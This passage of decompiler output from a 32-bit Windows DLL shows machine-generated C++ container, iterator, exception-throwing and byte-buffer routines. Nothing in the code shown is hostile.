  int v16; // eax
  void (__thiscall **v17)(_DWORD *, int); // esi
  int v18; // eax
  unsigned int v20; // [esp+24h] [ebp-40h] BYREF
  unsigned int v21; // [esp+28h] [ebp-3Ch] BYREF
  void *v22; // [esp+2Ch] [ebp-38h]
  unsigned int i; // [esp+3Ch] [ebp-28h]
  void *v24; // [esp+40h] [ebp-24h]
  unsigned int *v25; // [esp+44h] [ebp-20h] BYREF
  int v26[4]; // [esp+48h] [ebp-1Ch] BYREF
  int v27; // [esp+60h] [ebp-4h]
  char vars0; // [esp+64h] [ebp+0h]

  (*(void (__thiscall **)(_DWORD *, unsigned int **))(*this + 8))(this, &v25);
  v27 = 0;
  for ( i = 0; i < v26[0]; ++i )
  {
    v21 = i;
    v2 = (unsigned __int8 (__thiscall **)(int, int))(this[11] + 4);
    v3 = ((int (__thiscall *)(unsigned int **, unsigned int))v25[11])(&v25, i);
    if ( !(*v2)((int)(this + 11), v3) )
    {
      v4 = ((int (__thiscall *)(unsigned int **, unsigned int, void *))v25[11])(&v25, i, v22);
      v22 = v5;
      v21 = (unsigned int)v5;
      v25 = &v21;
      sub_10009F32(&v21, v4);
      vars0 = 1;
      v6 = (int (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 12);
      vars0 = 0;
      v7 = (*v6)(this, v21, v22);
      v22 = v24;
      v8 = this + 1;
      v9 = (unsigned __int8 (__thiscall **)(int, int))(this[1] + 4);
      if ( v7 )
      {
        v10 = (*(int (__thiscall **)(int *, void *))(v26[0] + 44))(v26, v22);
        if ( !(*v9)((int)(this + 1), v10) )
          goto LABEL_8;
      }
      else
      {
        v11 = (*(int (__thiscall **)(int *, void *))(v26[0] + 44))(v26, v22);
        if ( (*v9)((int)(this + 1), v11) )
        {
          v12 = ((int (__thiscall *)(unsigned int **, unsigned int))v25[11])(&v25, i);
          v21 = v13;
          v20 = v13;
          v24 = &v20;
          sub_10009F32(&v20, v12);
          LOBYTE(v27) = 2;
          v14 = (void (__thiscall **)(_DWORD *, unsigned int, unsigned int))(*this + 16);
          LOBYTE(v27) = 0;
          (*v14)(this, v20, v21);
          v15 = (void (__thiscall **)(int, int))(*v8 + 12);
          v16 = ((int (__thiscall *)(unsigned int **, unsigned int))v25[11])(&v25, i);
          (*v15)((int)(this + 1), v16);
          v8 = this + 11;
LABEL_8:
          v17 = (void (__thiscall **)(_DWORD *, int))(*v8 + 8);
          v18 = ((int (__thiscall *)(unsigned int **, unsigned int))v25[11])(&v25, i);
          (*v17)(v8, v18);
        }
      }
    }
  }
  v27 = -1;
  return sub_100022C5(&v25);
}
// 10007086: variable 'v5' is possibly undefined
// 100070E9: variable 'v13' is possibly undefined

//----- (10007172) --------------------------------------------------------
void *__thiscall sub_10007172(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F5EF;
  *this = &off_1007300C;
  *this = off_10072944;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007300C: using guessed type int (__thiscall *off_1007300C)(void *Block, char);

//----- (1000719C) --------------------------------------------------------
BOOL __thiscall sub_1000719C(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (100071B5) --------------------------------------------------------
int __thiscall sub_100071B5(int this, int a2)
{
  sub_10007865((void *)(this + 4), a2);
  return a2;
}

//----- (100071EB) --------------------------------------------------------
int __thiscall sub_100071EB(int this, int a2)
{
  sub_10007898((void *)(this + 20), a2);
  return a2;
}

//----- (10007221) --------------------------------------------------------
_DWORD *__thiscall sub_10007221(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
    v4 = sub_1000790B(v3, (int)this);
  else
    v4 = 0;
  sub_1000866A(a2, (int)v4);
  return a2;
}

//----- (1000727B) --------------------------------------------------------
_DWORD *__thiscall sub_1000727B(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10007A16(this, v3, 0);
  else
    v4 = 0;
  sub_100086FB(a2, (int)v4);
  return a2;
}

//----- (100072D8) --------------------------------------------------------
_DWORD *__thiscall sub_100072D8(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10007B86(this, v3, 0);
  else
    v4 = 0;
  sub_100085E7(a2, (int)v4);
  return a2;
}

//----- (10007335) --------------------------------------------------------
_DWORD *__thiscall sub_10007335(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10007A16(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100086FB(a2, (int)v4);
  return a2;
}

//----- (1000739A) --------------------------------------------------------
_DWORD *__thiscall sub_1000739A(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10007B86(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100085E7(a2, (int)v4);
  return a2;
}

//----- (100073FF) --------------------------------------------------------
_DWORD *__thiscall sub_100073FF(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10007A16(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100086FB(a2, (int)v6);
  return a2;
}

//----- (1000747E) --------------------------------------------------------
_DWORD *__thiscall sub_1000747E(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10007B86(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100085E7(a2, (int)v6);
  return a2;
}

//----- (100074FD) --------------------------------------------------------
void *__thiscall sub_100074FD(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F4E3;
  *this = &off_10073114;
  *this = off_10072944;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073114: using guessed type int (__thiscall *off_10073114)(void *Block, char);

//----- (10007527) --------------------------------------------------------
int *__thiscall sub_10007527(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100078D0(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000757F: variable 'v5' is possibly undefined

//----- (1000759A) --------------------------------------------------------
int *__thiscall sub_1000759A(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10007834(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100075F2: variable 'v5' is possibly undefined

//----- (1000760D) --------------------------------------------------------
void __thiscall sub_1000760D(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1000873F(v2);
}

//----- (1000764B) --------------------------------------------------------
void __thiscall sub_1000764B(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1000873F(v3);
}

//----- (1000768C) --------------------------------------------------------
void __thiscall sub_1000768C(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1000873F(v2);
}

//----- (100076CA) --------------------------------------------------------
int __thiscall sub_100076CA(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000862B(v4);
  return v2;
}

//----- (1000770E) --------------------------------------------------------
int __thiscall sub_1000770E(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000873F(v4);
  return v2;
}

//----- (10007752) --------------------------------------------------------
void __thiscall sub_10007752(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1000873F(v1);
}

//----- (100077A0) --------------------------------------------------------
_DWORD *__thiscall sub_100077A0(_DWORD *Block, char a2)
{
  sub_10007172(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100077F6) --------------------------------------------------------
_DWORD *__thiscall sub_100077F6(_DWORD *Block, char a2)
{
  sub_100074FD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007834) --------------------------------------------------------
int __usercall sub_10007834@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10007865) --------------------------------------------------------
int __thiscall sub_10007865(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10007898) --------------------------------------------------------
int __thiscall sub_10007898(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (100078D0) --------------------------------------------------------
int __usercall sub_100078D0@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000790B) --------------------------------------------------------
_DWORD *__stdcall sub_1000790B(_DWORD *a1, int a2)
{
  *a1 = &off_1007303C;
  a1[1] = a2;
  *a1 = &off_1007316C;
  sub_10007E5B(a1 + 2);
  a1[6] = 0;
  return a1;
}
// 1007303C: using guessed type int (__thiscall *off_1007303C)(void *Block, char);
// 1007316C: using guessed type int (__thiscall *off_1007316C)(void *Block, char);

//----- (10007955) --------------------------------------------------------
BOOL __thiscall sub_10007955(int this)
{
  return *(_DWORD *)(this + 24) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10007968) --------------------------------------------------------
BOOL __thiscall sub_10007968(_DWORD *this)
{
  return this[6] != 0;
}

//----- (10007972) --------------------------------------------------------
int __thiscall sub_10007972(int this)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
         *(_DWORD *)(this + 4) + 4,
         *(_DWORD *)(this + 24));
  sub_100021B1((int *)(v2 + 4), (int *)(this + 16));
  *(_BYTE *)(this + 20) = *(_BYTE *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      *(_DWORD *)(this + 24));
  return this + 8;
}

//----- (100079A8) --------------------------------------------------------
void __thiscall sub_100079A8(_DWORD *this)
{
  ++this[6];
}

//----- (100079AC) --------------------------------------------------------
void __thiscall sub_100079AC(_DWORD *this)
{
  --this[6];
}

//----- (100079B0) --------------------------------------------------------
void __noreturn sub_100079B0()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 100079B0: using guessed type void __noreturn sub_100079B0();
// 100079B0: using guessed type _DWORD pExceptionObject[2];

//----- (100079CD) --------------------------------------------------------
void __noreturn sub_100079CD()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 100079CD: using guessed type void __noreturn sub_100079CD();
// 100079CD: using guessed type _DWORD pExceptionObject[2];

//----- (100079EA) --------------------------------------------------------
void __thiscall sub_100079EA(int *this)
{
  *this = (int)off_10073038;
  sub_10009F65(this + 1);
}
// 10073038: using guessed type int (__thiscall *off_10073038[2])(void *Block, char);

//----- (10007A16) --------------------------------------------------------
_DWORD *__thiscall sub_10007A16(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1007314C;
  a2[1] = this;
  *a2 = &off_1007318C;
  a2[2] = a3;
  return result;
}
// 1007314C: using guessed type int (__thiscall *off_1007314C)(void *Block, char);
// 1007318C: using guessed type int (__thiscall *off_1007318C)(void *Block, char);

//----- (10007A4E) --------------------------------------------------------
void *__thiscall sub_10007A4E(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F40D;
  *this = &off_1007318C;
  *this = &off_1007314C;
  return result;
}
// 1007314C: using guessed type int (__thiscall *off_1007314C)(void *Block, char);
// 1007318C: using guessed type int (__thiscall *off_1007318C)(void *Block, char);

//----- (10007A78) --------------------------------------------------------
bool __thiscall sub_10007A78(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10007A8F) --------------------------------------------------------
BOOL __thiscall sub_10007A8F(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10007A99) --------------------------------------------------------
int __thiscall sub_10007A99(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10007AD4) --------------------------------------------------------
int __thiscall sub_10007AD4(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10007B0A) --------------------------------------------------------
int __thiscall sub_10007B0A(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10007B32) --------------------------------------------------------
int __thiscall sub_10007B32(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10007B6D) --------------------------------------------------------
int __thiscall sub_10007B6D(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10007B86) --------------------------------------------------------
_DWORD *__thiscall sub_10007B86(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1007305C;
  a2[1] = this;
  *a2 = &off_100731AC;
  a2[2] = a3;
  return result;
}
// 1007305C: using guessed type int (__thiscall *off_1007305C)(void *Block, char);
// 100731AC: using guessed type int (__thiscall *off_100731AC)(void *Block, char);

//----- (10007BBE) --------------------------------------------------------
void *__thiscall sub_10007BBE(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F3E9;
  *this = &off_100731AC;
  *this = &off_1007305C;
  return result;
}
// 1007305C: using guessed type int (__thiscall *off_1007305C)(void *Block, char);
// 100731AC: using guessed type int (__thiscall *off_100731AC)(void *Block, char);

//----- (10007BE8) --------------------------------------------------------
bool __thiscall sub_10007BE8(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10007BFF) --------------------------------------------------------
BOOL __thiscall sub_10007BFF(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10007C09) --------------------------------------------------------
int __thiscall sub_10007C09(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10007C44) --------------------------------------------------------
int __thiscall sub_10007C44(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10007C7A) --------------------------------------------------------
int __thiscall sub_10007C7A(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10007CA2) --------------------------------------------------------
int __thiscall sub_10007CA2(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10007CDD) --------------------------------------------------------
int __thiscall sub_10007CDD(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10007CF6) --------------------------------------------------------
_DWORD *__thiscall sub_10007CF6(_DWORD *Block, char a2)
{
  sub_10007DE5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007D13) --------------------------------------------------------
void __thiscall sub_10007D13(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 1;
  *(_DWORD *)((char *)v2 + v1 - 4) = &off_10072FC0;
  sub_1000DF1A(v2);
}
// 10072FC0: using guessed type int (__stdcall *off_10072FC0)(char);

//----- (10007D28) --------------------------------------------------------
_DWORD *__thiscall sub_10007D28(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10072FC8;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 1, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10072FC0;
  return this;
}
// 10072FC0: using guessed type int (__stdcall *off_10072FC0)(char);

//----- (10007D91) --------------------------------------------------------
int *__thiscall sub_10007D91(int *Block, char a2)
{
  sub_100079EA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007DAD) --------------------------------------------------------
_DWORD *__thiscall sub_10007DAD(_DWORD *Block, char a2)
{
  sub_10007A4E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007DC9) --------------------------------------------------------
_DWORD *__thiscall sub_10007DC9(_DWORD *Block, char a2)
{
  sub_10007BBE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007DE5) --------------------------------------------------------
void __stdcall sub_10007DE5(_DWORD *a1)
{
  sub_100079EA(a1 + 2);
  *a1 = &off_1007303C;
}
// 1007303C: using guessed type int (__thiscall *off_1007303C)(void *Block, char);

//----- (10007E18) --------------------------------------------------------
char *__thiscall sub_10007E18(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_10007D13(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10007E5B) --------------------------------------------------------
_DWORD *__stdcall sub_10007E5B(_DWORD *a1)
{
  *a1 = off_10073038;
  sub_10009D2C(a1 + 1, (wchar_t *)&word_10072FBC);
  return a1;
}
// 10073038: using guessed type int (__thiscall *off_10073038[2])(void *Block, char);

//----- (10007EB0) --------------------------------------------------------
void **__thiscall sub_10007EB0(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (10007EEF) --------------------------------------------------------
void *__thiscall sub_10007EEF(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_100730B8;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100074FD((_DWORD *)this);
}
// 100730B8: using guessed type int (__thiscall *off_100730B8)(void *Block, char);

//----- (10007F4D) --------------------------------------------------------
int __thiscall sub_10007F4D(_DWORD *this)
{
  return this[1];
}

//----- (10007F51) --------------------------------------------------------
int __thiscall sub_10007F51(_DWORD *this, _BYTE *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008EE57);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_BYTE *)(i + this[3]) = *(_BYTE *)(i + this[3] - 1);
  result = this[3];
  *(_BYTE *)(a3 + result) = *a2;
  ++this[1];
  return result;
}

//----- (10007FAB) --------------------------------------------------------
int __thiscall sub_10007FAB(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10007FC3) --------------------------------------------------------
int __thiscall sub_10007FC3(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008EE5A);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_BYTE *)(v2 + this[3]) = *(_BYTE *)(v2 + this[3] + 1);
    ++v2;
  }
  *(_BYTE *)((*(int (__thiscall **)(_DWORD *))(*this + 4))(this) + this[3]) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1000800B) --------------------------------------------------------
int __thiscall sub_1000800B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008EE5B);
  return a2 + this[3];
}

//----- (10008027) --------------------------------------------------------
int __thiscall sub_10008027(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008EE5E);
  return a2 + this[3];
}

//----- (10008043) --------------------------------------------------------
void __thiscall sub_10008043(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

